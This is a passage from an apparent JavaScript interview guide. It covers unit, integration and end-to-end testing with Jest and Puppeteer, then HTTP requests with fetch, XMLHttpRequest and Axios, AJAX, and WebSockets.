    return `$${amount.toFixed(2)}`;
}

test('formats currency', () => {
    expect(formatCurrency(10.5)).toBe('$10.50');
});

// INTEGRATION TESTS - Use for:

// 1. Database operations
test('saves and retrieves user from database', async () => {
    const user = await userRepository.create({ name: 'John' });
    const retrieved = await userRepository.findById(user.id);
    expect(retrieved.name).toBe('John');
});

// 2. API endpoints
test('POST /api/users creates user', async () => {
    const response = await request(app)
        .post('/api/users')
        .send({ name: 'John', email: 'john@example.com' });
    
    expect(response.status).toBe(201);
    expect(response.body.name).toBe('John');
});

// 3. Service interactions
test('order service coordinates payment and inventory', async () => {
    const order = await orderService.createOrder(orderData);
    
    // Verify payment processed
    const payment = await paymentService.getPayment(order.paymentId);
    expect(payment.status).toBe('completed');
    
    // Verify inventory updated
    const product = await inventoryService.getProduct(productId);
    expect(product.stock).toBe(originalStock - quantity);
});
```

### Mock Usage Differences

```javascript
// UNIT TEST - Mock everything except unit under test
describe('OrderService - Unit Test', () => {
    test('creates order with mocked dependencies', async () => {
        const mockDatabase = {
            createOrder: jest.fn().mockResolvedValue({ id: 1 })
        };
        const mockPayment = {
            process: jest.fn().mockResolvedValue({ success: true })
        };
        
        const service = new OrderService(mockDatabase, mockPayment);
        const result = await service.createOrder({});
        
        expect(mockDatabase.createOrder).toHaveBeenCalled();
        expect(mockPayment.process).toHaveBeenCalled();
    });
});

// INTEGRATION TEST - Use real implementations or test doubles
describe('OrderService - Integration Test', () => {
    test('creates order with real database', async () => {
        const database = new TestDatabase(); // Real in-memory database
        const payment = new MockPaymentGateway(); // Test double for external service
        
        const service = new OrderService(database, payment);
        const result = await service.createOrder(orderData);
        
        // Verify actual database state
        const order = await database.getOrder(result.id);
        expect(order).toBeDefined();
        expect(order.items).toHaveLength(2);
    });
});
```

### Test Execution Speed

```javascript
// UNIT TESTS - Fast
// Run time: milliseconds
describe('Fast Unit Tests', () => {
    test('add numbers', () => {
        expect(add(2, 3)).toBe(5);  // < 1ms
    });
    
    test('validate email', () => {
        expect(isValidEmail('test@example.com')).toBe(true);  // < 1ms
    });
});

// Total: ~100 unit tests = ~100ms

// INTEGRATION TESTS - Slower
// Run time: seconds
describe('Slower Integration Tests', () => {
    test('create user in database', async () => {
        const user = await userService.register(userData);  // ~50-200ms
        expect(user.id).toBeDefined();
    });
    
    test('process payment', async () => {
        const result = await paymentService.process(payment);  // ~100-500ms

    expect(result.success).toBe(true);
        });
});

// Total: ~20 integration tests = ~2-5 seconds

// E2E TESTS - Slowest
// Run time: minutes
describe('Very Slow E2E Tests', () => {
    test('complete checkout flow', async () => {
        await browser.goto('/products');  // ~1-2s
        await browser.click('.add-to-cart');  // ~500ms
        await browser.goto('/checkout');  // ~1-2s
        await browser.fill('#card-number', '4242424242424242');  // ~500ms
        await browser.click('#submit');  // ~1-2s
        // Total per test: ~5-10 seconds
    });
});

// Total: ~5 e2e tests = ~30-60 seconds
```

### Key Differences Summary

```javascript
// === UNIT TESTS ===
const unitTestCharacteristics = {
    scope: 'Single function/method',
    dependencies: 'All mocked',
    speed: 'Very fast (milliseconds)',
    isolation: 'Complete isolation',
    quantity: 'Many (100s to 1000s)',
    runFrequency: 'Every save/commit',
    debuggingDifficulty: 'Easy - pinpoint exact failure',
    coverage: 'High code coverage',
    confidence: 'Code works in isolation',
    
    example: `
        // Test single function
        test('calculates tax', () => {
            expect(calculateTax(100, 0.08)).toBe(8);
        });
    `
};

// === INTEGRATION TESTS ===
const integrationTestCharacteristics = {
    scope: 'Multiple components together',
    dependencies: 'Real or realistic implementations',
    speed: 'Slower (seconds)',
    isolation: 'Tests component interactions',
    quantity: 'Moderate (10s to 100s)',
    runFrequency: 'Before commits/PRs',
    debuggingDifficulty: 'Harder - multiple components involved',
    coverage: 'Tests integration points',
    confidence: 'Components work together',
    
    example: `
        // Test service with real database
        test('creates and retrieves user', async () => {
            const created = await userService.create(userData);
            const retrieved = await userService.getById(created.id);
            expect(retrieved.name).toBe(userData.name);
        });
    `
};

// === E2E TESTS ===
const e2eTestCharacteristics = {
    scope: 'Entire application',
    dependencies: 'Real system',
    speed: 'Very slow (seconds to minutes)',
    isolation: 'Tests complete workflows',
    quantity: 'Few (5 to 20)',
    runFrequency: 'Before releases',
    debuggingDifficulty: 'Very hard - many moving parts',
    coverage: 'Tests user journeys',
    confidence: 'System works end-to-end',
    
    example: `
        // Test complete user journey
        test('user can complete purchase', async () => {
            await loginAsUser();
            await searchForProduct('laptop');
            await addToCart();
            await checkout();
            await verifyOrderConfirmation();
        });
    `
};
```

### Real-World Example: E-commerce System

```javascript
// === UNIT TESTS (Fast, Isolated) ===

// discountCalculator.test.js
describe('DiscountCalculator - Unit Tests', () => {
    test('calculates percentage discount', () => {
        const calculator = new DiscountCalculator();
        expect(calculator.calculatePercentage(100, 10)).toBe(10);
    });
    
    test('applies fixed amount discount', () => {
        const calculator = new DiscountCalculator();
        expect(calculator.applyFixed(100, 15)).toBe(85);
    });
    
    test('returns 0 for invalid discount', () => {
        const calculator = new DiscountCalculator();
        expect(calculator.calculatePercentage(100, -5)).toBe(0);
    });
});

// priceFormatter.test.js
describe('PriceFormatter - Unit Tests', () => {
    test('formats USD currency', () => {
        expect(PriceFormatter.format(10.5, 'USD')).toBe('$10.50');
    });
    
    test('formats EUR currency', () => {
        expect(PriceFormatter.format(10.5, 'EUR')).toBe('€10.50');
    });
});

// === INTEGRATION TESTS (Realistic Dependencies) ===

// orderService.integration.test.js
describe('OrderService - Integration Tests', () => {
    let orderService;
    let testDatabase;
    let testPaymentGateway;
    
    beforeAll(async () => {
        testDatabase = new InMemoryDatabase();
        await testDatabase.initialize();
        
        testPaymentGateway = new TestPaymentGateway();
        
        orderService = new OrderService(
            testDatabase,
            testPaymentGateway,
            new EmailService({ testMode: true }),
            new InventoryService(testDatabase)
        );
    });
    
    test('creates order and updates inventory', async () => {
        // Seed test data
        await testDatabase.createProduct({ id: 1, name: 'Laptop', stock: 10 });
        await testDatabase.createUser({ id: 1, email: 'user@example.com' });
        
        // Create order
        const order = await orderService.createOrder({
            userId: 1,
            items: [{ productId: 1, quantity: 2 }]
        });
        
        // Verify order created
        expect(order.id).toBeDefined();
        expect(order.status).toBe('pending');
        
        // Verify inventory reduced
        const product = await testDatabase.getProduct(1);
        expect(product.stock).toBe(8);
        
        // Verify order stored in database
        const storedOrder = await testDatabase.getOrder(order.id);
        expect(storedOrder).toBeDefined();
        expect(storedOrder.items).toHaveLength(1);
    });
    
    test('processes payment and sends confirmation', async () => {
        await testDatabase.createProduct({ id: 2, name: 'Mouse', stock: 50 });
        await testDatabase.createUser({ id: 2, email: 'customer@example.com' });
        
        const order = await orderService.createOrder({
            userId: 2,
            items: [{ productId: 2, quantity: 1 }]
        });
        
        // Process payment
        await orderService.processPayment(order.id, {
            cardNumber: '4242424242424242',
            cvv: '123'
        });
        
        // Verify order status updated
        const processedOrder = await testDatabase.getOrder(order.id);
        expect(processedOrder.status).toBe('paid');
        expect(processedOrder.paymentId).toBeDefined();
        
        // Verify payment record
        const payment = testPaymentGateway.getPayment(processedOrder.paymentId);
        expect(payment.amount).toBe(processedOrder.total);
        expect(payment.status).toBe('success');
    });
    
    test('handles out of stock scenario', async () => {
        await testDatabase.createProduct({ id: 3, name: 'Keyboard', stock: 1 });
        
        await expect(
            orderService.createOrder({
                userId: 1,
                items: [{ productId: 3, quantity: 5 }]
            })
        ).rejects.toThrow('Insufficient stock');
        
        // Verify stock unchanged
        const product = await testDatabase.getProduct(3);
        expect(product.stock).toBe(1);
    });
});

// cartService.integration.test.js
describe('CartService - Integration Tests', () => {
    let cartService;
    let database;
    
    beforeEach(async () => {
        database = new InMemoryDatabase();
        await database.initialize();
        cartService = new CartService(database, new PriceCalculator());
    });
    
    test('adds items and calculates total correctly', async () => {
        const userId = 1;
        
        // Seed products
        await database.createProduct({ id: 1, name: 'Item 1', price: 10 });
        await database.createProduct({ id: 2, name: 'Item 2', price: 20 });
        
        // Add items to cart
        await cartService.addItem(userId, { productId: 1, quantity: 2 });
        await cartService.addItem(userId, { productId: 2, quantity: 1 });
        
        // Get cart
        const cart = await cartService.getCart(userId);
        
        // Verify items
        expect(cart.items).toHaveLength(2);
        expect(cart.items[0].quantity).toBe(2);
        
        // Verify total calculation (integration with PriceCalculator)
        expect(cart.subtotal).toBe(40); // (10 * 2) + (20 * 1)
    });
    
    test('applies discount codes', async () => {
        const userId = 1;
        
        await database.createProduct({ id: 1, name: 'Item', price: 100 });
        await database.createDiscount({ code: 'SAVE10', percent: 10 });
        
        await cartService.addItem(userId, { productId: 1, quantity: 1 });
        await cartService.applyDiscount(userId, 'SAVE10');
        
        const cart = await cartService.getCart(userId);
        
        expect(cart.subtotal).toBe(100);
        expect(cart.discount).toBe(10);
        expect(cart.total).toBe(90);
    });
});

// === E2E TESTS (Complete Workflows) ===

// checkout.e2e.test.js
describe('Checkout Flow - E2E Tests', () => {
    let browser;
    let page;
    
    beforeAll(async () => {
        browser = await puppeteer.launch();
        page = await browser.newPage();
    });
    
    afterAll(async () => {
        await browser.close();
    });
    
    test('complete purchase journey', async () => {
        // 1. Browse products
        await page.goto('http://localhost:3000/products');
        await page.waitForSelector('.product-card');
        
        // 2. Add to cart
        await page.click('.product-card:first-child .add-to-cart');
        await page.waitForSelector('.cart-count');
        expect(await page.$eval('.cart-count', el => el.textContent)).toBe('1');
        
        // 3. Go to cart
        await page.click('.cart-icon');
        await page.waitForSelector('.cart-items');
        
        // 4. Proceed to checkout
        await page.click('.checkout-button');
        await page.waitForSelector('.checkout-form');
        
        // 5. Fill shipping info
        await page.type('#email', 'test@example.com');
        await page.type('#address', '123 Main St');
        await page.type('#city', 'New York');
        await page.type('#zip', '10001');
        
        // 6. Continue to payment
        await page.click('.continue-to-payment');
        await page.waitForSelector('.payment-form');
        
        // 7. Enter payment details
        await page.type('#card-number', '4242424242424242');
        await page.type('#expiry', '12/25');
        await page.type('#cvv', '123');
        
        // 8. Submit order
        await page.click('.submit-order');
        await page.waitForSelector('.order-confirmation');
        
        // 9. Verify success
        const confirmationText = await page.$eval(
            '.order-confirmation h1',
            el => el.textContent
        );
        expect(confirmationText).toContain('Order Confirmed');
        
        // 10. Verify order number displayed
        const orderNumber = await page.$eval('.order-number', el => el.textContent);
        expect(orderNumber).toMatch(/^ORD-\d+$/);
    });
});
```

### Test Organization Best Practices

```javascript
// Recommended folder structure

/*
project/
├── src/
│   ├── services/
│   │   ├── orderService.js
│   │   └── cartService.js
│   ├── utils/
│   │   ├── calculator.js
│   │   └── validator.js
│   └── models/
│       └── user.js
│
├── tests/
│   ├── unit/                          # Many fast tests
│   │   ├── utils/
│   │   │   ├── calculator.test.js
│   │   │   └── validator.test.js
│   │   └── models/
│   │       └── user.test.js
│   │
│   ├── integration/                   # Moderate number
│   │   ├── services/
│   │   │   ├── orderService.integration.test.js
│   │   │   └── cartService.integration.test.js
│   │   └── api/
│   │       └── endpoints.integration.test.js
│   │
│   └── e2e/                          # Few critical paths
│       ├── checkout.e2e.test.js
│       ├── userRegistration.e2e.test.js
│       └── productSearch.e2e.test.js
│
└── jest.config.js
*/

// jest.config.js - Separate configurations
module.exports = {
    projects: [
        {
            displayName: 'unit',
            testMatch: ['**/tests/unit/**/*.test.js'],
            testEnvironment: 'node'
        },
        {
            displayName: 'integration',
            testMatch: ['**/tests/integration/**/*.test.js'],
            testEnvironment: 'node',
            setupFilesAfterEnv: ['./tests/integration/setup.js']
        },
        {
            displayName: 'e2e',
            testMatch: ['**/tests/e2e/**/*.test.js'],
            testEnvironment: 'node',
            testTimeout: 30000
        }
    ]
};

// Run specific test types
// npm run test:unit
// npm run test:integration
// npm run test:e2e
// npm run test:all
```

### Important Notes

**Unit Tests:**
- Test individual functions/methods in complete isolation
- Mock all dependencies
- Very fast execution (milliseconds)
- Easy to debug and maintain
- Should form majority of your test suite (70-80%)
- Run on every file save during development

**Integration Tests:**
- Test multiple components working together
- Use real or realistic implementations
- Slower execution (seconds)
- Test interactions between modules
- Should be 15-25% of your test suite
- Run before commits and in CI/CD

**Key Differences:**
- **Scope**: Unit = single component, Integration = multiple components
- **Dependencies**: Unit = all mocked, Integration = real/realistic
- **Speed**: Unit = milliseconds, Integration = seconds
- **Quantity**: Unit = many (100s), Integration = moderate (10s)
- **Purpose**: Unit = verify logic, Integration = verify interactions

**When to Use:**
- Unit tests for business logic, calculations, utilities
- Integration tests for database operations, API calls, service coordination
- Both are necessary for comprehensive testing
- Follow testing pyramid: more unit tests, fewer integration tests

---

# Networking with JavaScript (57-60)

## 57. How do you make HTTP requests in JavaScript?

JavaScript provides multiple ways to make HTTP requests, from traditional XMLHttpRequest to modern Fetch API.

### Using Fetch API (Modern)

```javascript
// 1. Basic GET request
fetch('https://api.example.com/users')
    .then(response => response.json())
    .then(data => {
        console.log('Users:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });

// 2. GET request with async/await
async function getUsers() {
    try {
        const response = await fetch('https://api.example.com/users');
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('Users:', data);
        return data;
    } catch (error) {
        console.error('Error fetching users:', error);
        throw error;
    }
}

// 3. POST request
async function createUser(userData) {
    try {
        const response = await fetch('https://api.example.com/users', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const newUser = await response.json();
        console.log('Created user:', newUser);
        return newUser;
    } catch (error) {
        console.error('Error creating user:', error);
        throw error;
    }
}

// Usage
createUser({
    name: 'John Doe',
    email: 'john@example.com',
    age: 30
});

// 4. PUT request (update)
async function updateUser(userId, updates) {
    const response = await fetch(`https://api.example.com/users/${userId}`, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(updates)
    });
    
    return response.json();
}

// 5. DELETE request
async function deleteUser(userId) {
    const response = await fetch(`https://api.example.com/users/${userId}`, {
        method: 'DELETE'
    });
    
    if (response.ok) {
        console.log('User deleted successfully');
    }
    
    return response.ok;
}

// 6. Request with headers (authentication)
async function getProtectedData() {
    const response = await fetch('https://api.example.com/protected', {
        headers: {
            'Authorization': 'Bearer your-token-here',
            'Content-Type': 'application/json'
        }
    });
    
    return response.json();
}
```

### Advanced Fetch Options

```javascript
// 1. Request with timeout
async function fetchWithTimeout(url, timeout = 5000) {
    const controller = new AbortController();
    const signal = controller.signal;
    
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(url, { signal });
        clearTimeout(timeoutId);
        return await response.json();
    } catch (error) {
        clearTimeout(timeoutId);
        
        if (error.name === 'AbortError') {
            throw new Error('Request timeout');
        }
        
        throw error;
    }
}

// Usage
try {
    const data = await fetchWithTimeout('https://api.example.com/data', 3000);
    console.log(data);
} catch (error) {
    console.error('Request failed:', error.message);
}

// 2. Cancel request
const controller = new AbortController();
const signal = controller.signal;

fetch('https://api.example.com/large-data', { signal })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => {
        if (error.name === 'AbortError') {
            console.log('Request cancelled');
        } else {
            console.error('Error:', error);
        }
    });

// Cancel the request
controller.abort();

// 3. Upload file with progress tracking
async function uploadFile(file) {
    const formData = new FormData();
    formData.append('file', file);
    
    const response = await fetch('https://api.example.com/upload', {
        method: 'POST',
        body: formData
    });
    
    return response.json();
}

// Usage
const fileInput = document.getElementById('file-input');
fileInput.addEventListener('change', async (event) => {
    const file = event.target.files[0];
    
    try {
        const result = await uploadFile(file);
        console.log('Upload successful:', result);
    } catch (error) {
        console.error('Upload failed:', error);
    }
});

// 4. Retry logic
async function fetchWithRetry(url, maxRetries = 3) {
    for (let i = 0; i < maxRetries; i++) {
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            return await response.json();
        } catch (error) {
            console.log(`Attempt ${i + 1} failed:`, error.message);
            
            if (i === maxRetries - 1) {
                throw error;
            }
            
            // Wait before retry (exponential backoff)
            await new Promise(resolve => 
                setTimeout(resolve, Math.pow(2, i) * 1000)
            );
        }
    }
}

// Usage
fetchWithRetry('https://api.example.com/data')
    .then(data => console.log('Success:', data))
    .catch(error => console.error('All retries failed:', error));
```

### Using XMLHttpRequest (Legacy)

```javascript
// 1. Basic GET request
const xhr = new XMLHttpRequest();

xhr.open('GET', 'https://api.example.com/users');

xhr.onload = function() {
    if (xhr.status === 200) {
        const data = JSON.parse(xhr.responseText);
        console.log('Users:', data);
    } else {
        console.error('Error:', xhr.statusText);
    }
};

xhr.onerror = function() {
    console.error('Request failed');
};

xhr.send();

// 2. POST request with XMLHttpRequest
function createUser(userData) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        
        xhr.open('POST', 'https://api.example.com/users');
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
                resolve(JSON.parse(xhr.responseText));
            } else {
                reject(new Error(xhr.statusText));
            }
        };
        
        xhr.onerror = function() {
            reject(new Error('Network error'));
        };
        
        xhr.send(JSON.stringify(userData));
    });
}

// Usage
createUser({ name: 'John', email: 'john@example.com' })
    .then(user => console.log('Created:', user))
    .catch(error => console.error('Error:', error));

// 3. Track upload progress
function uploadWithProgress(file, onProgress) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        const formData = new FormData();
        formData.append('file', file);
        
        // Track upload progress
        xhr.upload.addEventListener('progress', (event) => {
            if (event.lengthComputable) {
                const percentComplete = (event.loaded / event.total) * 100;
                onProgress(percentComplete);
            }
        });
        
        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                resolve(JSON.parse(xhr.responseText));
            } else {
                reject(new Error(`Upload failed: ${xhr.status}`));
            }
        });
        
        xhr.addEventListener('error', () => {
            reject(new Error('Upload failed'));
        });
        
        xhr.open('POST', 'https://api.example.com/upload');
        xhr.send(formData);
    });
}

// Usage
const file = document.getElementById('file-input').files[0];
uploadWithProgress(file, (percent) => {
    console.log(`Upload progress: ${percent.toFixed(2)}%`);
})
    .then(result => console.log('Upload complete:', result))
    .catch(error => console.error('Upload failed:', error));
```

### Using Axios (Popular Library)

```javascript
// Install: npm install axios

const axios = require('axios');

// 1. GET request
axios.get('https://api.example.com/users')
    .then(response => {
        console.log('Users:', response.data);
    })
    .catch(error => {
        console.error('Error:', error.message);
    });

// 2. POST request
async function createUser(userData) {
    try {
        const response = await axios.post(
            'https://api.example.com/users',
            userData
        );
        console.log('Created user:', response.data);
        return response.data;
    } catch (error) {
        console.error('Error:', error.response?.data || error.message);
        throw error;
    }
}

// 3. Request with configuration
const response = await axios({
    method: 'post',
    url: 'https://api.example.com/users',
    data: {
        name: 'John',
        email: 'john@example.com'
    },
    headers: {
        'Authorization': 'Bearer token',
        'Content-Type': 'application/json'
    },
    timeout: 5000
});

// 4. Multiple concurrent requests
async function fetchMultipleResources() {
    try {
        const [users, products, orders] = await Promise.all([
            axios.get('https://api.example.com/users'),
            axios.get('https://api.example.com/products'),
            axios.get('https://api.example.com/orders')
        ]);
        
        return {
            users: users.data,
            products: products.data,
            orders: orders.data
        };
    } catch (error) {
        console.error('Error fetching resources:', error);
        throw error;
    }
}

// 5. Interceptors (middleware)
// Request interceptor
axios.interceptors.request.use(
    config => {
        // Add auth token to all requests
        const token = localStorage.getItem('token');
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
        return config;
    },
    error => {
        return Promise.reject(error);
    }
);

// Response interceptor
axios.interceptors.response.use(
    response => {
        return response;
    },
    error => {
        if (error.response?.status === 401) {
            // Handle unauthorized
            window.location.href = '/login';
        }
        return Promise.reject(error);
    }
);

// 6. Create axios instance with defaults
const api = axios.create({
    baseURL: 'https://api.example.com',
    timeout: 10000,
    headers: {
        'Content-Type': 'application/json'
    }
});

// Use instance
api.get('/users').then(response => console.log(response.data));
api.post('/users', userData).then(response => console.log(response.data));
```

### HTTP Request Wrapper Class

```javascript
// Reusable HTTP client class
class HttpClient {
    constructor(baseURL) {
        this.baseURL = baseURL;
        this.defaultHeaders = {
            'Content-Type': 'application/json'
        };
    }
    
    async request(endpoint, options = {}) {
        const url = `${this.baseURL}${endpoint}`;
        const config = {
            ...options,
            headers: {
                ...this.defaultHeaders,
                ...options.headers
            }
        };
        
        try {
            const response = await fetch(url, config);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            // Handle empty responses
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                return await response.json();
            }
            
            return await response.text();
        } catch (error) {
            console.error('Request failed:', error);
            throw error;
        }
    }
    
    get(endpoint, options = {}) {
        return this.request(endpoint, {
            ...options,
            method: 'GET'
        });
    }
    
    post(endpoint, data, options = {}) {
        return this.request(endpoint, {
            ...options,
            method: 'POST',
            body: JSON.stringify(data)
        });
    }
    
    put(endpoint, data, options = {}) {
        return this.request(endpoint, {
            ...options,
            method: 'PUT',
            body: JSON.stringify(data)
        });
    }
    
    delete(endpoint, options = {}) {
        return this.request(endpoint, {
            ...options,
            method: 'DELETE'
        });
    }
    
    setAuthToken(token) {
        this.defaultHeaders['Authorization'] = `Bearer ${token}`;
    }
}

// Usage
const api = new HttpClient('https://api.example.com');

// Set auth token
api.setAuthToken('your-token-here');

// Make requests
const users = await api.get('/users');
const newUser = await api.post('/users', { name: 'John', email: 'john@example.com' });
await api.delete(`/users/${userId}`);
```

### Error Handling Patterns

```javascript
// Comprehensive error handling
async function fetchWithErrorHandling(url) {
    try {
        const response = await fetch(url);
        
        // Handle HTTP errors
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({}));
            
            switch (response.status) {
                case 400:
                    throw new Error(`Bad Request: ${errorData.message || 'Invalid request'}`);
                case 401:
                    throw new Error('Unauthorized: Please login');
                case 403:
                    throw new Error('Forbidden: Access denied');
                case 404:
                    throw new Error('Not Found: Resource does not exist');
                case 500:
                    throw new Error('Server Error: Please try again later');
                default:
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
        }
        
        return await response.json();
    } catch (error) {
        // Handle network errors
        if (error instanceof TypeError) {
            throw new Error('Network error: Please check your connection');
        }
        
        // Re-throw other errors
        throw error;
    }
}

// Usage with user feedback
async function loadUserData() {
    const loadingEl = document.getElementById('loading');
    const errorEl = document.getElementById('error');
    const dataEl = document.getElementById('data');
    
    try {
        loadingEl.style.display = 'block';
        errorEl.style.display = 'none';
        
        const data = await fetchWithErrorHandling('https://api.example.com/users');
        
        dataEl.innerHTML = JSON.stringify(data, null, 2);
    } catch (error) {
        errorEl.textContent = error.message;
        errorEl.style.display = 'block';
    } finally {
        loadingEl.style.display = 'none';
    }
}
```

### Important Notes

- **Fetch API**: Modern, promise-based, cleaner syntax
- **XMLHttpRequest**: Legacy, more verbose, but supports progress events
- **Axios**: Popular library with interceptors, automatic JSON parsing
- Always handle errors appropriately
- Use async/await for cleaner code
- Set appropriate headers (Content-Type, Authorization)
- Implement timeouts for long-running requests
- Consider retry logic for failed requests
- Use AbortController to cancel requests
- Handle different response types (JSON, text, blob)
- Implement proper error handling and user feedback

---


## 58. What is the difference between XMLHttpRequest and Fetch API?

**XMLHttpRequest (XHR)** is the older API for making HTTP requests in JavaScript, while **Fetch API** is the modern, promise-based alternative introduced in ES6.

### Key Differences:

**Syntax & Structure:**
- XHR uses callback-based patterns with event listeners, making code more verbose and harder to read
- Fetch uses promises, enabling cleaner syntax with `.then()` chains or `async/await`

**Response Handling:**
- XHR requires manual parsing and checking of response status through properties like `readyState` and `status`
- Fetch automatically returns a Response object with built-in methods like `.json()`, `.text()`, `.blob()`

**Error Handling:**
- XHR triggers error events for network failures
- Fetch only rejects promises on network failures, not HTTP error status codes (like 404 or 500), requiring manual status checking

**Request Cancellation:**
- XHR can abort requests using `.abort()` method
- Fetch requires the AbortController API for cancellation

**Cookie Handling:**
- XHR sends cookies by default
- Fetch requires explicit `credentials: 'include'` option to send cookies

**Progress Events:**
- XHR natively supports upload/download progress events
- Fetch requires using ReadableStream for progress tracking

### Example Comparison:

**XMLHttpRequest:**
```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.onload = function() {
  if (xhr.status === 200) {
    const data = JSON.parse(xhr.responseText);
    console.log(data);
  }
};
xhr.onerror = function() {
  console.error('Request failed');
};
xhr.send();
```

**Fetch API:**
```javascript
fetch('https://api.example.com/data')
  .then(response => {
    if (!response.ok) throw new Error('HTTP error');
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('Request failed:', error));

// Or with async/await:
async function getData() {
  try {
    const response = await fetch('https://api.example.com/data');
    if (!response.ok) throw new Error('HTTP error');
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error('Request failed:', error);
  }
}
```

## 59. What is AJAX, and how does it work?

**AJAX (Asynchronous JavaScript and XML)** is a web development technique that allows web pages to update content dynamically without requiring a full page reload. Despite its name, AJAX can work with various data formats including JSON, HTML, and plain text, not just XML.

### How AJAX Works:

**The Process:**

1. **User Interaction:** A user triggers an event (clicking a button, submitting a form, scrolling, etc.)

2. **JavaScript Event Handler:** JavaScript captures the event and creates an HTTP request

3. **Asynchronous Request:** The request is sent to the server in the background using XMLHttpRequest or Fetch API

4. **Server Processing:** The server receives the request, processes it, and sends back a response

5. **Response Handling:** JavaScript receives the response and processes it

6. **DOM Update:** The page is updated dynamically by manipulating the DOM, without reloading

### Core Components:

- **JavaScript:** Handles events and orchestrates the entire process
- **XMLHttpRequest or Fetch API:** Makes asynchronous requests to the server
- **Server-side Script:** Processes requests and returns data (PHP, Node.js, Python, etc.)
- **Data Format:** Usually JSON or XML for structured data exchange
- **DOM Manipulation:** Updates specific parts of the page with new content

### Example Implementation:

```javascript
// Using Fetch API (modern AJAX)
document.getElementById('loadButton').addEventListener('click', async () => {
  try {
    // Send asynchronous request
    const response = await fetch('https://api.example.com/users');
    const users = await response.json();
    
    // Update DOM with received data
    const userList = document.getElementById('userList');
    userList.innerHTML = users.map(user => 
      `<li>${user.name} - ${user.email}</li>`
    ).join('');
  } catch (error) {
    console.error('Error loading users:', error);
  }
});
```

### Benefits of AJAX:

- **Better User Experience:** Pages feel faster and more responsive
- **Reduced Bandwidth:** Only necessary data is transferred, not entire pages
- **Asynchronous Processing:** Users can continue interacting with the page while requests process
- **Reduced Server Load:** Partial updates require less processing than full page renders
- **Real-time Updates:** Enables features like live search, notifications, and chat

### Common Use Cases:

- Live search suggestions as you type
- Infinite scrolling on social media feeds
- Form validation without page refresh
- Auto-saving drafts
- Loading comments or reviews dynamically
- Real-time notifications
- Interactive maps and data visualization

## 60. How do you use WebSockets in a web application?

**WebSockets** provide full-duplex, bidirectional communication between a client and server over a single, long-lived connection. Unlike HTTP (which is request-response based), WebSockets enable real-time data exchange where both client and server can send messages independently.

### Basic WebSocket Implementation:

**Client-Side (JavaScript):**

```javascript
// Create WebSocket connection
const socket = new WebSocket('ws://localhost:8080');

// Connection opened
socket.addEventListener('open', (event) => {
  console.log('Connected to WebSocket server');
  socket.send('Hello Server!');
});

// Listen for messages from server
socket.addEventListener('message', (event) => {
  console.log('Message from server:', event.data);
  document.getElementById('messages').innerHTML += `<p>${event.data}</p>`;
});

// Handle errors
socket.addEventListener('error', (error) => {
  console.error('WebSocket error:', error);
});

// Connection closed
socket.addEventListener('close', (event) => {
  console.log('Disconnected from server');
});

// Send message to server
function sendMessage(message) {
  if (socket.readyState === WebSocket.OPEN) {
    socket.send(message);
  }
}

// Close connection
function closeConnection() {
  socket.close();
}
```

**Server-Side (Node.js with ws library):**

```javascript
const WebSocket = require('ws');
const server = new WebSocket.Server({ port: 8080 });

server.on('connection', (socket) => {
  console.log('Client connected');

  // Send message to client
  socket.send('Welcome to the WebSocket server!');

  // Receive messages from client
  socket.on('message', (message) => {
    console.log('Received:', message);
    
    // Broadcast to all connected clients
    server.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(`Broadcast: ${message}`);
      }
    });
  });

  // Handle client disconnect
  socket.on('close', () => {
    console.log('Client disconnected');
  });

  // Handle errors
  socket.on('error', (error) => {
    console.error('WebSocket error:', error);
  });
});
```

### WebSocket Connection States:

- **CONNECTING (0):** Connection is being established
- **OPEN (1):** Connection is established and ready to communicate
- **CLOSING (2):** Connection is being closed
- **CLOSED (3):** Connection is closed or couldn't be opened

### Advanced Features:

**Sending Different Data Types:**

```javascript
// Send text
socket.send('Hello');

// Send JSON
socket.send(JSON.stringify({ type: 'chat', message: 'Hello' }));

// Send binary data (Blob or ArrayBuffer)
const buffer = new ArrayBuffer(8);
socket.send(buffer);
```

**Handling Reconnection:**

```javascript
let socket;
let reconnectInterval = 5000;

function connect() {
  socket = new WebSocket('ws://localhost:8080');
  
  socket.onopen = () => {
    console.log('Connected');
  };
  
  socket.onclose = () => {
    console.log('Disconnected. Reconnecting...');
    setTimeout(connect, reconnectInterval);
  };
  
  socket.onerror = (error) => {
    console.error('Error:', error);
    socket.close();
  };
}

connect();
```

**Heartbeat/Ping-Pong (Keep-Alive):**

```javascript
// Client-side
let heartbeatInterval;

socket.addEventListener('open', () => {
  heartbeatInterval = setInterval(() => {
    if (socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000); // Every 30 seconds
});

socket.addEventListener('close', () => {
  clearInterval(heartbeatInterval);
});
```

### Common Use Cases:

- **Chat Applications:** Real-time messaging between users
- **Live Sports/Stock Tickers:** Continuous data updates
- **Collaborative Editing:** Multiple users editing documents simultaneously
- **Online Gaming:** Real-time multiplayer interactions
- **IoT Dashboards:** Live sensor data streaming
- **Notifications:** Push notifications without polling
